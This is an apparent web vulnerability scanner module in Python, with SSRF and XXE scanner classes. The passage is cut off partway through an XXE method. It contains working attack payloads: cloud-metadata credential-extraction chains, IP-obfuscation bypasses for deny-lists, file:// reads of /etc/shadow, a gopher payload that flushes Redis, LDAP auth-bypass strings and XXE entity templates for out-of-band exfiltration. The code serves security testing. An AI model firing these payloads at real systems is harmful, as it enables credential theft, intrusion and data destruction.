from __future__ import annotations
import time
import logging
import re
import requests
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse, urljoin

from .base import BaseScanner
from websecure.core.payloads import load_external_payloads

try:
    from websecure.core.oast import OASTScannerMixin as _OASTScannerMixin
except ImportError:
    class _OASTScannerMixin:  # type: ignore[assignment]
        """Fallback no-op mixin when oast module is unavailable."""

try:
    from websecure.core.utils import random_string
except ImportError:
    import random as _rand
    import string as _string
    def random_string(n: int = 8) -> str:
        return "".join(_rand.choices(_string.ascii_lowercase + _string.digits, k=n))

logger = logging.getLogger(__name__)

# =============================================================================
# Configuration dataclasses
# =============================================================================

@dataclass
class OASTConfig:
    enabled: bool = True
    provider: str = "generic"
    dns_domain: Optional[str] = None
    token_prefix: str = "ws"
    timeout: int = 15
    enable_local_schemes: bool = True
    enable_dict_scheme: bool = False
    enable_tftp_scheme: bool = True
    enable_metadata_probes: bool = True
    timing_threshold: float = 2.0
    base_headers: Dict[str, str] = field(default_factory=dict)
    base_cookies: Dict[str, str] = field(default_factory=dict)


@dataclass
class ScannerTuning:
    concurrency: int = 6
    retries: int = 0
    methods: Tuple[str, ...] = ("GET", "POST")
    user_agent: str = "WebSecure/SSRF-XXE 1.2"
    respect_redirects: bool = True


@dataclass
class SSRFXXEConfig:
    oast: OASTConfig = field(default_factory=OASTConfig)
    tuning: ScannerTuning = field(default_factory=ScannerTuning)


# =============================================================================
# Constants
# =============================================================================

COMMON_URL_PARAMS = [
    "url", "redirect", "next", "dest", "destination", "callback", "u",
    "return", "return_to", "continue", "target", "endpoint", "webhook",
    "feed", "link", "out", "source", "file", "path", "image", "img",
    "avatar", "download", "proxy", "fetch", "load", "open", "read",
]

BODY_URL_KEYS = [
    "url", "webhook", "avatar", "image", "callback", "target",
    "endpoint", "feed", "source", "file", "path", "proxy",
]

# Cloud metadata endpoints
METADATA_BASES = [
    "http://169.254.169.254",   # AWS/GCP/Azure
    "http://100.100.100.200",   # Alibaba Cloud
    "http://192.168.0.1",       # Common router
    "http://10.0.0.1",          # Internal gateway
]
AWS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/hostname",
    "/latest/meta-data/public-keys/",
    "/latest/user-data",
    "/latest/dynamic/instance-identity/document",
]
GCP_PATHS = [
    "/computeMetadata/v1/instance/service-accounts/default/token",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/instance/hostname",
]
AZURE_PATHS = [
    "/metadata/instance?api-version=2021-02-01",
    "/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
]
GCP_HEADERS = {"Metadata-Flavor": "Google"}
AZURE_HEADERS = {"Metadata": "true"}

# Cloud metadata success markers
METADATA_MARKERS = [
    "ami-id", "instance-id", "local-ipv4", "public-hostname",
    "service-accounts", "project-id",
    "IAMCredentials",
]

# Internal port scanning targets
_INTERNAL_IPS = ["127.0.0.1", "localhost", "0.0.0.0"]
_SCAN_PORTS = [21, 22, 80, 443, 2375, 3306, 5432, 5672, 6379, 8080, 8443, 8888, 9200, 27017]

# ---------------------------------------------------------------------------
# Enhanced IP obfuscation table (merged from ssrf.py _IP_OBFUSCATIONS)
# Covers bypass of naive SSRF allow-lists/deny-lists
# ---------------------------------------------------------------------------
_IP_OBFUSCATIONS: Dict[str, List[str]] = {
    "localhost": [
        "127.0.0.1", "2130706433",      # decimal
        "0x7f000001",                    # hex single
        "0177.0.0.1",                   # octal
        "127.0.0.0x01",                # mixed
        "[::]",                         # IPv6 any
        "[::1]",                        # IPv6 loopback
        "localhost.",                   # trailing dot
        "LOCALHOST",                    # uppercase
        "0:0:0:0:0:ffff:7f00:0001",    # IPv6 mapped
        "localtest.me",                # public DNS -> 127.0.0.1
    ],
    "169.254.169.254": [
        "2852039166",                   # decimal
        "0xa9fea9fe",                   # hex
        "0251.0376.0251.0376",         # octal
        "169.254.169.254.",            # trailing dot
        "[::ffff:a9fe:a9fe]",          # IPv6 mapped
        "169.254.169.254%2F",          # URL encoded slash
    ],
}

# ---------------------------------------------------------------------------
# Internal service fingerprinting signatures (from ssrf.py SSRFLateralMovementProber)
# ---------------------------------------------------------------------------
_SERVICE_SIGNATURES: Dict[str, re.Pattern] = {
    "Redis":          re.compile(r"PONG|redis_version|\+OK", re.I),
    "Elasticsearch":  re.compile(r"cluster_name|tagline|version.*number", re.I),
    "Docker API":     re.compile(r"ApiVersion|OSType|ServerVersion", re.I),
    "MongoDB":        re.compile(r"ismaster|maxBsonObjectSize|ok.*1", re.I),
    "Kubernetes API": re.compile(r"kind.*Status|apiVersion|Unauthorized", re.I),
    "Consul":         re.compile(r"Config|Datacenter|NodeName", re.I),
    "Prometheus":     re.compile(r"go_gc_duration|# TYPE|# HELP", re.I),
    "Grafana":        re.compile(r"Grafana|grafana_info|dashboards", re.I),
}

# Known internal service endpoints for fingerprinting
_INTERNAL_SERVICE_TARGETS = [
    "http://127.0.0.1:9200/_cat/indices",               # Elasticsearch
    "http://127.0.0.1:2375/v1.24/containers/json",      # Docker API
    "http://127.0.0.1:8500/v1/agent/self",              # Consul
    "http://127.0.0.1:9090/metrics",                    # Prometheus
    "http://127.0.0.1:3000/api/health",                 # Grafana
    "http://172.17.0.1:2375/v1.24/containers/json",     # Docker bridge
]

# ---------------------------------------------------------------------------
# URL scheme payloads — extended with ftp/ldap/sftp from ssrf.py
# ---------------------------------------------------------------------------
_SCHEME_PAYLOADS_CORE = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:11211/stats",
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    # Extended protocols (from ssrf.py SSRFProtocolExpander)
    "ftp://127.0.0.1:21/",
    "ldap://127.0.0.1:389/",
    "sftp://127.0.0.1:22/",
]

# Protocol-specific response detection patterns
_PROTOCOL_DETECT: Dict[str, re.Pattern] = {
    "ftp://":    re.compile(r"220|230|ftp", re.I),
    "ldap://":   re.compile(r"objectClass|dc=", re.I),
    "sftp://":   re.compile(r"ssh-|protocol|banner", re.I),
    "dict://":   re.compile(r"redis_version|OS:", re.I),
    "gopher://": re.compile(r"\+OK|PONG", re.I),
}

def _load_ssrf_payloads() -> list:
    seen = set(_SCHEME_PAYLOADS_CORE)
    ext = []
    for line in load_external_payloads("ssrf"):
        if line and line not in seen:
            seen.add(line)
            ext.append(line)
    return _SCHEME_PAYLOADS_CORE + ext

_SCHEME_PAYLOADS = _load_ssrf_payloads()

# OOB fallback host (used if no OAST domain configured)
_OOB_HOST = "ssrf-xxe-wsp.invalid"

# XXE templates
XXE_POC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY ext SYSTEM "{U}"> ]>
<root><v>&ext;</v></root>"""

XXE_SVG = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "{U}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>"""

# XML endpoint auto-discovery paths (from xxe.py)
_XML_PATHS = [
    "/api/import", "/api/upload", "/api/xml", "/api/soap",
    "/soap", "/wsdl", "/services", "/api/data",
    "/import", "/upload", "/api/v1/import", "/api/v1/xml",
]

# XXE file targets — core + xxe.txt wordlist
_XXE_TARGETS_CORE = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
]

# Extended file list for all XXE sub-techniques
_XXE_TARGET_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "/windows/win.ini", "/windows/system32/drivers/etc/hosts",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
]

def _load_xxe_targets() -> list:
    seen = set(_XXE_TARGETS_CORE)
    ext = []
    for line in load_external_payloads("xxe"):
        for m in re.finditer(r'(?:SYSTEM\s+"([^"]+)"|href="([^"]+)")', line):
            uri = m.group(1) or m.group(2)
            if uri and uri not in seen:
                seen.add(uri)
                ext.append(uri)
    return _XXE_TARGETS_CORE + ext

_XXE_TARGETS = _load_xxe_targets()

# XXE success markers
_XXE_MARKERS = [
    r"root:x:0:0",
    r"\[fonts\]",
    r"HOME=/",
    r"PATH=/",
]

# Error fingerprints indicating SSRF connectivity
ERROR_FINGERPRINTS = [
    "connection refused", "timed out", "no route to host", "invalid host",
    "host is unreachable", "could not resolve", "failed to connect",
    "network unreachable", "connection reset",
]


# =============================================================================
# Helper functions
# =============================================================================

def _encode_ip_variants(ip: str) -> List[str]:
    """
    Generate IP encoding variants to bypass SSRF allow-lists.
    Uses the enhanced _IP_OBFUSCATIONS table for known IPs,
    falls back to standard numeric encoding for others.
    """
    # Use the richer table for known IPs
    for canonical, variants in _IP_OBFUSCATIONS.items():
        if ip == canonical or ip in variants:
            return list(variants)
    # Fallback: generate numeric variants
    try:
        a, b, c, d = (int(x) for x in ip.split("."))
        return [
            ip,
            ".".join(f"{p:03o}" for p in (a, b, c, d)),                       # Octal
            ".".join(f"{p:02x}" for p in (a, b, c, d)),                       # Hex dotted
            str(a * (256 ** 3) + b * (256 ** 2) + c * 256 + d),              # Decimal
            "0x" + "".join(f"{p:02x}" for p in (a, b, c, d)),                # Hex single
        ]
    except ValueError:
        return [ip]


def _inject_url_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query))
    qs[param] = value
    return urlunparse(parsed._replace(query=urlencode(qs)))


def _has_metadata_marker(text: str) -> bool:
    lower = text.lower()
    return any(m.lower() in lower for m in METADATA_MARKERS)


def _detect_xxe_in_response(text: str) -> Optional[str]:
    """Returns matched marker if XXE file contents appear in the response."""
    for marker in _XXE_MARKERS:
        if re.search(marker, text):
            return marker
    return None


def _detect_xml_endpoints(base_url: str, session) -> List[str]:
    """
    Scan common XML-accepting paths and return reachable ones.
    Falls back to base_url if none are found. (Ported from xxe.py)
    """
    found = []
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    # soft-404/catch-all farkındalı varlık kontrolü (modül fonksiyonu olduğundan
    # BaseScanner.path_exists yerine paylaşılan baseline doğrudan kullanılır).
    try:
        from websecure.core.fp_reducer import SoftNotFoundBaseline as _SNFB
        _bl = _SNFB.for_target(session, base)
    except Exception:
        _bl = None
    for path in _XML_PATHS:
        url = urljoin(base + "/", path.lstrip("/"))
        try:
            r = session.get(url, timeout=5, verify=False)
            _ok = (_bl.is_genuine_hit(r) if _bl is not None
                   else r.status_code not in (404, 410))
            if _ok:
                found.append(url)
        except Exception as _fix_e:
            logger.debug(f"[scanners.ssrf_xxe] {type(_fix_e).__name__}: {_fix_e!r}")
    return found or [base_url]


def _post_xml_payload(session, url: str, xml: str, timeout: int = 10) -> Optional[requests.Response]:
    """POST XML payload with appropriate content-type. (Ported from xxe.py)"""
    for ct in ["application/xml", "text/xml"]:
        try:
            r = session.post(
                url, data=xml.encode("utf-8"),
                headers={"Content-Type": ct}, timeout=timeout, verify=False,
            )
            return r
        except Exception as _fix_e:
            logger.debug(f"[scanners.ssrf_xxe] {type(_fix_e).__name__}: {_fix_e!r}")
    return None


def _identify_service(body: str) -> Optional[str]:
    """Match response body against known internal service signatures."""
    for service, pattern in _SERVICE_SIGNATURES.items():
        if pattern.search(body):
            return service
    return None


# =============================================================================
# SSRFScanner
# =============================================================================

class SSRFScanner(_OASTScannerMixin, BaseScanner):
    """
    Server-Side Request Forgery (SSRF) Scanner.

    Inherits OASTScannerMixin for out-of-band DNS/HTTP callback verification:
    use self.oast_new_token(), self.oast_payloads(), self.oast_poll(),
    self.oast_correlate() for SSRF OOB confirmation.

    Techniques:
    - Cloud metadata endpoint probing (AWS, GCP, Azure, Alibaba)
    - Enhanced IP encoding variants (10+ localhost bypass variants)
    - AWS IAM credential chain extraction (role -> secret keys)
    - URL scheme abuse: file://, gopher://, dict://, ftp://, ldap://, sftp://
    - Protocol-specific response fingerprinting
    - Internal port scanning via response timing
    - Internal service fingerprinting (Redis, Elasticsearch, Docker, MongoDB, etc.)
    - Body-based SSRF (POST parameters containing URL fields)
    - OAST DNS callback (when dns_domain is configured)
    """

    name = "ssrf"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        logger.info(f"[SSRF] Scanning {len(endpoints)} endpoints")

        for ep in endpoints:
            self._scan_endpoint(ep, bucket)
            self._scan_ldap_injection(ep, bucket)
            self._scan_dns_rebinding(ep, bucket)

        return self.results

    # -------------------------------------------------------------------------
    # LDAP Injection
    # -------------------------------------------------------------------------

    def _scan_ldap_injection(self, url: str, bucket: str) -> None:
        """LDAP injection — auth bypass ve blind veri sızdırma tespiti."""
        from urllib.parse import parse_qsl, urlparse
        parsed = urlparse(url)
        params = [p for p, _ in parse_qsl(parsed.query)]
        if not params:
            return

        ldap_bypass = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            ")(|(password=*)",
            "*))(|(objectClass=*",
            "' or (cn=*)(",
            "*)(|(objectClass=organizationalPerson)",
        ]
        ldap_error_sigs = [
            r"LDAPException", r"javax\.naming", r"com\.sun\.jndi",
            r"ldap_.*error", r"LDAP.*syntax.*error", r"Invalid DN",
            r"No Such Object", r"ldap_search", r"Directory.*error",
            r"objectClass.*violation", r"naming.*exception",
        ]

        for param in params:
            baseline = self.fetch_baseline(url)
            if not baseline:
                continue

            for payload in ldap_bypass:
                injected = self.inject_param(url, param, payload)
                try:
                    resp = self.session.get(injected, timeout=8)
                except Exception:
                    continue
                text = resp.text or ""
                for sig in ldap_error_sigs:
                    if re.search(sig, text, re.IGNORECASE):
                        self.add(bucket, {
                            "type": "LDAP Injection",
                            "severity": "High",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"LDAP error signature matched: {sig}",
                            "detection_method": "error_based",
                        })
                        return
                # Auth bypass heuristic: response grew significantly with wildcard
                if (payload == "*" and resp.status_code == 200
                        and baseline.status_code != 200):
                    self.add(bucket, {
                        "type": "LDAP Injection (Auth Bypass)",
                        "severity": "Critical",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Status {baseline.status_code}→{resp.status_code} with wildcard payload",
                        "detection_method": "boolean_blind",
                    })
                    return

    # -------------------------------------------------------------------------
    # DNS Rebinding
    # -------------------------------------------------------------------------

    def _scan_dns_rebinding(self, url: str, bucket: str) -> None:
        """
        DNS rebinding — SSRF'in iç-ağ varyantı.
        İki teknik kontrol eder:
        1. TTL=0 rebinding payload'ı: özel domain server → önce dış IP, sonra 127.0.0.1
        2. Loopback varyantları (0.0.0.0, [::]): bazı resolver'lar bunları çözer
        """
        from urllib.parse import parse_qsl, urlparse
        parsed = urlparse(url)
        params = [p for p, _ in parse_qsl(parsed.query) if p.lower() in COMMON_URL_PARAMS]
        if not params:
            return

        # Known DNS rebinding / loopback bypass payloads
        rebind_payloads = [
            "http://0.0.0.0/",
            "http://[::]/",
            "http://[::1]/",
            "http://0/",
            "http://0177.0.0.1/",           # Octal 127
            "http://2130706433/",            # Decimal 127.0.0.1
            "http://0x7f000001/",            # Hex 127.0.0.1
            "http://127.1/",
            "http://127.0.1/",
        ]

        internal_markers = [
            r"ssh-\d+\.\d+", r"220.*FTP", r"HTTP/1\.[01]",
            r"<title>.*Admin", r"redis_version",
        ]

        for param in params:
            for payload in rebind_payloads:
                injected = self.inject_param(url, param, payload)
                try:
                    resp = self.session.get(injected, timeout=5, allow_redirects=False)
                except Exception:
                    continue
                text = resp.text or ""
                if resp.status_code in (200, 301, 302, 307):
                    for sig in internal_markers:
                        if re.search(sig, text, re.IGNORECASE):
                            self.add(bucket, {
                                "type": "DNS Rebinding / SSRF Loopback Bypass",
                                "severity": "High",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Internal marker '{sig}' in response",
                                "detection_method": "response_content",
                            })
                            break
                    else:
                        # Heuristic: unexpected 200 on internal-like payload
                        if resp.status_code == 200 and len(text) > 100:
                            self.add(bucket, {
                                "type": "DNS Rebinding / SSRF Loopback Bypass",
                                "severity": "Medium",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"HTTP 200 with loopback payload, {len(text)} bytes",
                                "detection_method": "status_heuristic",
                            })
                            break

    def _scan_endpoint(self, url: str, bucket: str):
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query)
        url_params = [p for p, _ in qs if p.lower() in COMMON_URL_PARAMS]

        for param in url_params:
            self._test_cloud_metadata(url, param, qs, bucket)
            self._test_scheme_abuse(url, param, bucket)
            if self.config.oast.enable_metadata_probes:
                self._test_internal_ports(url, param, bucket)

        # Service fingerprinting via SSRF injection
        self._test_service_fingerprint(url, url_params[:2] if url_params else [], bucket)

        # Body-based SSRF
        self._test_body_ssrf(url, bucket)

        # OAST DNS callback
        if self.config.oast.dns_domain:
            self._test_oast_dns(url, url_params, bucket)

    # -------------------------------------------------------------------------
    # Cloud metadata probing with AWS credential chain extraction
    # -------------------------------------------------------------------------

    def _test_cloud_metadata(self, url: str, param: str, qs: List[Tuple], bucket: str):
        metadata_targets = []
        for base_ip in ["169.254.169.254", "100.100.100.200"]:
            for variant in _encode_ip_variants(base_ip):
                for path in AWS_PATHS:
                    metadata_targets.append((f"http://{variant}{path}", {}, "AWS"))
                for path in GCP_PATHS:
                    metadata_targets.append((f"http://{variant}{path}", GCP_HEADERS, "GCP"))
                for path in AZURE_PATHS:
                    metadata_targets.append((f"http://{variant}{path}", AZURE_HEADERS, "Azure"))

        for meta_url, extra_headers, cloud in metadata_targets:
            t_url = _inject_url_param(url, param, meta_url)
            try:
                resp = self.session.get(t_url, headers=extra_headers, timeout=4,
                                        allow_redirects=True)
                if resp.status_code == 200 and _has_metadata_marker(resp.text):
                    # AWS credential chain: if IAM credentials endpoint found, extract role name
                    credential_data = None
                    if cloud == "AWS" and "security-credentials" in meta_url:
                        role_match = re.search(r"([A-Za-z0-9_\-]+)", resp.text)
                        if role_match:
                            role_name = role_match.group(1)
                            cred_meta_url = meta_url.rstrip("/") + "/" + role_name
                            cred_t_url = _inject_url_param(url, param, cred_meta_url)
                            try:
                                cred_resp = self.session.get(cred_t_url, timeout=6)
                                cred_body = cred_resp.text[:1000]
                                if "AccessKeyId" in cred_body or "SecretAccessKey" in cred_body:
                                    credential_data = {
                                        "role": role_name,
                                        "cred_snippet": cred_body[:300],
                                    }
                            except Exception as _fix_e:
                                logger.debug(f"[scanners.ssrf_xxe] {type(_fix_e).__name__}: {_fix_e!r}")

                    finding = {
                        "type": "SSRF — Cloud Metadata Exposed",
                        "severity": "Critical",
                        "url": url,
                        "parameter": param,
                        "payload": meta_url,
                        "cloud_provider": cloud,
                        "evidence": resp.text[:300],
                    }
                    if credential_data:
                        finding["credentials_extracted"] = credential_data
                    self.add(bucket, finding)
                    logger.warning(f"[SSRF] Cloud metadata ({cloud}) via {url} param={param}")
                    return
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[SSRF] Cloud metadata probe failed for {meta_url!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # URL scheme abuse — extended with ftp/ldap/sftp/protocol fingerprinting
    # -------------------------------------------------------------------------

    def _test_scheme_abuse(self, url: str, param: str, bucket: str):
        if not self.config.oast.enable_local_schemes:
            return

        for payload in _SCHEME_PAYLOADS:
            t_url = _inject_url_param(url, param, payload)
            try:
                resp = self.session.get(t_url, timeout=6, allow_redirects=False)
                text = resp.text or ""

                # file:// markers
                if "root:x:0:0" in text or "[fonts]" in text or "for 16-bit" in text:
                    self.add(bucket, {
                        "type": "SSRF — URL Scheme Abuse (LFI via file://)",
                        "severity": "Critical",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": text[:200],
                    })
                    return

                # Protocol-specific fingerprint detection
                scheme_prefix = (payload.split("://")[0] + "://") if "://" in payload else ""
                detect_re = _PROTOCOL_DETECT.get(scheme_prefix)
                if detect_re and resp.status_code == 200 and detect_re.search(text):
                    self.add(bucket, {
                        "type": f"SSRF — URL Scheme Abuse ({scheme_prefix})",
                        "severity": "High",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": text[:200],
                    })
                    return

                # Generic gopher/dict positive detection
                if payload.startswith(("dict://", "gopher://")) and resp.status_code == 200 and len(text) > 10:
                    self.add(bucket, {
                        "type": f"SSRF — URL Scheme Abuse ({payload.split(':')[0]}://)",
                        "severity": "High",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": text[:200],
                    })
                    return
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[SSRF] Scheme abuse probe failed for {payload!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # Internal port scanning via timing
    # -------------------------------------------------------------------------

    def _test_internal_ports(self, url: str, param: str, bucket: str):
        threshold = self.config.oast.timing_threshold
        try:
            t0 = time.time()
            self.session.get(url, timeout=5)
            baseline = time.time() - t0
        except requests.exceptions.RequestException:
            baseline = 1.0

        for ip in ["127.0.0.1", "localhost"]:
            for port in _SCAN_PORTS:
                probe_url = f"http://{ip}:{port}/"
                t_url = _inject_url_param(url, param, probe_url)
                t0 = time.time()
                try:
                    resp = self.session.get(t_url, timeout=threshold + 2, allow_redirects=False)
                    elapsed = time.time() - t0
                    text = resp.text or ""
                    if resp.status_code == 200 and len(text) > 10:
                        service = _identify_service(text)
                        self.add(bucket, {
                            "type": f"SSRF — Internal Port Open: {ip}:{port}",
                            "severity": "High",
                            "url": url,
                            "parameter": param,
                            "payload": probe_url,
                            "service": service or "Unknown",
                            "evidence": f"HTTP 200 with {len(text)} bytes in {elapsed:.2f}s",
                        })
                    elif elapsed > baseline + threshold:
                        self.add(bucket, {
                            "type": f"SSRF — Blind Internal Port Probe: {ip}:{port}",
                            "severity": "Medium",
                            "url": url,
                            "parameter": param,
                            "payload": probe_url,
                            "evidence": f"Request took {elapsed:.2f}s (baseline {baseline:.2f}s)",
                        })
                except requests.exceptions.RequestException as exc:
                    logger.debug(f"[SSRF] Internal port probe failed for {probe_url!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # Internal service fingerprinting (from ssrf.py SSRFLateralMovementProber)
    # -------------------------------------------------------------------------

    def _test_service_fingerprint(self, url: str, params: List[str], bucket: str):
        """
        Probe known internal service endpoints via SSRF injection.
        Identifies Redis, Elasticsearch, Docker API, MongoDB, Consul, etc.
        """
        if not params:
            return
        param = params[0]

        for service_url in _INTERNAL_SERVICE_TARGETS:
            t_url = _inject_url_param(url, param, service_url)
            try:
                resp = self.session.get(t_url, timeout=5, allow_redirects=True)
                body = (resp.text or "")[:2000]
                if resp.status_code in (200, 401, 403):
                    service = _identify_service(body)
                    if service:
                        self.add(bucket, {
                            "type": "SSRF — Internal Service Fingerprinted",
                            "severity": "High",
                            "url": url,
                            "parameter": param,
                            "payload": service_url,
                            "service": service,
                            "evidence": body[:300],
                        })
                        logger.warning(
                            f"[SSRF] Internal {service} at {service_url} via {url} param={param}"
                        )
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[SSRF] Service fingerprint failed for {service_url!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # Body-based SSRF
    # -------------------------------------------------------------------------

    def _test_body_ssrf(self, url: str, bucket: str):
        for key in BODY_URL_KEYS:
            for meta_base in METADATA_BASES[:2]:
                for path in AWS_PATHS[:2]:
                    payload = meta_base + path
                    try:
                        resp = self.session.post(url, json={key: payload}, timeout=5)
                        if resp.status_code == 200 and _has_metadata_marker(resp.text):
                            self.add(bucket, {
                                "type": "SSRF — Body-Based Cloud Metadata Exposure",
                                "severity": "Critical",
                                "url": url,
                                "parameter": key,
                                "payload": payload,
                                "evidence": resp.text[:300],
                            })
                            return
                    except requests.exceptions.RequestException as exc:
                        logger.debug(f"[SSRF] Body SSRF probe failed for key={key!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # OAST DNS callback
    # -------------------------------------------------------------------------

    def _test_oast_dns(self, url: str, params: List[str], bucket: str):
        domain = self.config.oast.dns_domain
        if not domain:
            return
        token = random_string(8)
        callback_url = f"http://{token}.{domain}/"

        for param in params:
            t_url = _inject_url_param(url, param, callback_url)
            try:
                self.session.get(t_url, timeout=self.config.oast.timeout, allow_redirects=True)
                self.add(bucket, {
                    "type": "SSRF — OAST DNS Callback Sent",
                    "severity": "High",
                    "url": url,
                    "parameter": param,
                    "payload": callback_url,
                    "evidence": f"Check DNS logs for {token}.{domain}",
                    "note": "Confirm OOB DNS resolution in your OAST server logs",
                })
                logger.info(f"[SSRF] OAST callback sent for param={param}, token={token}")
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[SSRF] OAST DNS callback failed for param={param!r}: {exc!r}")


# =============================================================================
# XXEScanner
# =============================================================================

class XXEScanner(BaseScanner):
    """
    XML External Entity (XXE) Injection Scanner.

    Techniques:
    - Auto-detect XML-accepting endpoints (/api/xml, /soap, /wsdl, etc.)
    - Classic in-band file read (file:///etc/passwd)
    - CDATA wrapper bypass (combine internal + external DTD entities)
    - Error-based XXE (parameter entity chain forces parse error with file content)
    - Billion Laughs lite (nested entity expansion DoS detection, safe 3-level)
    - External parameter entity double-wrapping file read
    - XXE via SVG upload (image upload endpoints)
    - Blind XXE via OAST DNS callback
    - OOB HTTP data exfiltration via timing detection
    """

    name = "xxe"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        logger.info(f"[XXE] Scanning {len(endpoints)} endpoints")

        for ep in endpoints:
            self._scan_endpoint(ep, bucket)

        return self.results

    def _scan_endpoint(self, url: str, bucket: str):
        # Auto-discover XML-accepting endpoints at this target
        xml_endpoints = _detect_xml_endpoints(url, self.session)

        for ep in xml_endpoints[:4]:
            # Classic in-band read
            self._test_xml_post(ep, bucket)
            # CDATA bypass
            self._test_cdata_bypass(ep, bucket)
            # Error-based parameter entity
            self._test_error_based_param_entity(ep, bucket)
            # Billion Laughs DoS detection (safe)
            self._test_param_entity_nested(ep, bucket)
            # External parameter entity double-wrap
            self._test_param_entity_external(ep, bucket)

        # SVG upload on original URL
        self._test_svg_xxe(url, bucket)

        # OAST-based blind detection
        if self.config.oast.dns_domain:
            for ep in xml_endpoints[:2]:
                self._test_blind_xxe_oast(ep, bucket)
                self._test_oob_http_exfil(ep, bucket)

    # -------------------------------------------------------------------------
    # Classic in-band file read
    # -------------------------------------------------------------------------

    def _test_xml_post(self, url: str, bucket: str):
        for target_file in _XXE_TARGETS:
            payload = XXE_POC.replace("{U}", target_file)
            try:
                resp = self.session.post(
                    url, data=payload.encode(),
                    headers={"Content-Type": "application/xml"}, timeout=8,
                )
                text = resp.text or ""
                marker = _detect_xxe_in_response(text)
                if marker:
                    self.add(bucket, {
                        "type": "XXE — Classic In-Band File Read",
                        "severity": "Critical",
                        "url": url,
                        "payload_target": target_file,
                        "evidence": f"Marker '{marker}' found in response: {text[:200]}",
                    })
                    logger.warning(f"[XXE] File read confirmed at {url} via {target_file}")
                    return
                if re.search(r"(?i)XML.*parse.*error|DOCTYPE.*not.*allowed|entity.*not.*permitted", text):
                    self.add(bucket, {
                        "type": "XXE — DOCTYPE Processing Detected",
                        "severity": "Medium",
                        "url": url,
                        "payload_target": target_file,
                        "evidence": "Server references DOCTYPE in error — XXE processing likely enabled",
                    })
                    return
            except requests.exceptions.RequestException as exc:
                logger.debug(f"[XXE] XML POST probe failed for {target_file!r}: {exc!r}")

    # -------------------------------------------------------------------------
    # CDATA bypass (ported from xxe.py XXEErrorBasedExtractor._probe_cdata)
    # -------------------------------------------------------------------------

    def _test_cdata_bypass(self, url: str, bucket: str):
        """CDATA wrapper bypass — wraps file content in CDATA to avoid XML parse errors."""
        oob_host = self.config.oast.dns_domain or _OOB_HOST
        for fpath in _XXE_TARGET_FILES[:3]:
            xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                '  <!ENTITY % start "<![CDATA[">'
                f'  <!ENTITY % content SYSTEM "file://{fpath}">'
                '  <!ENTITY % end "]]>">'
                f'  <!ENTITY % dtd SYSTEM "http://{oob_host}/__cdata.dtd">'
                '  %dtd;'
                ']>'
                '<root><data>&joined;</data></root>'
            )
            resp = _post_xml_payload(self.session, url, xml, timeout=8)
            if resp is None:
                continue
            body = (resp.text or "")[:3000]
            if re.search(r"root:.*:0:0:|Administrator", body):
                self.add(bucket, {
                    "type": "XXE — CDATA Bypass File Read",
                    "severity": "Critical",
                    "url": url,
                    "payload_target": fpath,
                    "evidence": body[:300],
                })
                logger.warning(f"[XXE] CDATA bypass confirmed at {url}")
                return

    # -------------------------------------------------------------------------
    # Error-based parameter entity (ported from xxe.py XXEErrorBasedExtractor._probe_error_based)
    # -------------------------------------------------------------------------

    def _test_error_based_param_entity(self, url: str, bucket: str):
        """Parameter entity chaining — parse error forces file content into error message."""
        for fpath in _XXE_TARGET_FILES[:3]:
            xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                f'  <!ENTITY % file SYSTEM "file://{fpath}">'
                '  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM'
